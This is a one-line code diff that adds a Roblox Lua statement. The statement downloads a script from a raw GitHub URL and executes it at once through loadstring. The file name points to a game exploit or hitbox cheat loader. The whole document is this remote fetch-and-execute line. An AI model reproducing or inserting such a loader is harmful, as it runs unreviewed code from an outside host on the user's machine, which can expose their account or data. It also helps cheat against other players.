@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/hitbox-changes-azure-latch-spam0-rjali4vwjei1hu.lua"))()
